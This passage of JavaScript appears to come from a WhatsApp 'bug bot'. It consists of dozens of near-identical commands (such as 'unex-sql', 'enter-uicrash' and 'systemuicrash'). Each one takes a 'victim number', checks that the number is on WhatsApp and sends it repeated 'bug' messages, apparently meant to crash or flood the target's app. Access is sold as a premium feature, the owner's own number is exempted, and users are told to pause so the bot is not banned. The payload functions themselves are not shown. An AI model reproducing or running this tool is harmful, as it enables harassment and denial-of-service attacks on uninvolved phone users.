  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "jids-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
   case "xandroid2":
  {
	if (!isOwner) return
	{
      return reply("*This feature is for the bot only!*");
    }
    if (!text){
      return reply(`Example usage: ${prefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return reply("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    reply("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    sendVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('✅');
  }
  break;
case "jids-engine": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "unex-strong": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-jids": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-system": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-sql": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case "unex-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-system": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-engine": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-uicrash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-ui": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-mybug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "enter-devil": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "unex-bug": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break

case "systemuicrash": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case "devil-external": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await anggazyy.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "62882021771652") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "devil-internal": {

if (!isPremium) return reply('khusus premium user, jika ingin premium beli ke owner dengan cara .owner')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
